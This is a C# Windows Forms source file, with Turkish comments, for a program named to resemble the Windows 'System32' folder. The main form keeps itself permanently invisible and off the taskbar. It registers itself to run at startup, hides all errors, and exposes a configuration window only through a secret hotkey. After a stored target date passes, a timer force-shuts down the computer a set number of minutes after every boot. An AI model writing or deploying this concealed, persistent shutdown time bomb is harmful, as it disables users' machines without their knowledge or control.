using Sysstem32.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Sysstem32
{
    public partial class Form1 : Form
    {
        private HotkeyManager _hotkeyManager;
        private bool _allowVisible = false;
        private ConfigForm _configForm = null;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = false;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            // Artık tamamen gizli mod aktif
            _allowVisible = false;

            // Sistem başlatma işlemleri
            InitializeSystem();
        }


        private void InitializeSystem()
        {
            try
            {
                // DateTime manager'ı başlat
                DateTimeManager.Initialize();

                // Memory footprint'i minimize et
                SystemManager.MinimizeMemoryFootprint();

                // Startup'a ekle
                if (!SystemManager.IsInStartup())
                {
                    SystemManager.AddToStartup();
                }

                // Hotkey manager'ı başlat
                _hotkeyManager = new HotkeyManager(this.Handle);
                _hotkeyManager.HotkeyPressed += OnHotkeyPressed;
                _hotkeyManager.RegisterHotkey();

                // Ana döngüyü başlat
                timerMainLoop.Start();
            }
            catch
            {
                // Sessizce devam et
            }
        }

        private void timerMainLoop_Tick(object sender, EventArgs e)
        {
            CheckSystemStatus();
        }

        private void CheckSystemStatus()
        {
            try
            {
                // Statik zamanı güncelle (her timer tick'inde)
                DateTime currentTime = DateTime.Now;

                if (DateTimeManager.IsExpiredModeActive())
                {
                    int delayMinutes = ConfigManager.GetDelayMinutes();
                    DateTime bootTime = DateTimeManager.GetStaticBootTime();

                    // Gerçek geçen süreyi hesapla
                    TimeSpan runTime = currentTime - bootTime;

                    if (runTime.TotalMinutes >= delayMinutes)
                    {
                        SystemManager.ForceShutdown();
                        return;
                    }
                }
                else
                {
                    // Hedef tarihi current time ile karşılaştır
                    DateTime? targetDate = DateTimeManager.GetTargetDate();
                    if (targetDate.HasValue && currentTime >= targetDate.Value)
                    {
                        DateTimeManager.ActivateExpiredMode();
                    }
                }
            }
            catch { }
        }

        protected override void WndProc(ref Message m)
        {
            _hotkeyManager?.ProcessHotkey(m);
            base.WndProc(ref m);
        }

        private void OnHotkeyPressed(object sender, EventArgs e)
        {
            try
            {
                if (_configForm == null)
                {
                    _configForm = new ConfigForm();
                }

                _configForm.Show();
                _configForm.BringToFront();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Config form açma hatası: {ex.Message}");
            }
        }

        protected override void SetVisibleCore(bool value)
        {
            // İlk kez görünür olmasına izin ver (Load eventi için)
            if (!_allowVisible && !IsHandleCreated)
            {
                _allowVisible = true;
                base.SetVisibleCore(true);
                return;
            }

            // Bundan sonra hiçbir zaman görünür olma
            base.SetVisibleCore(false);
        }
    }
}
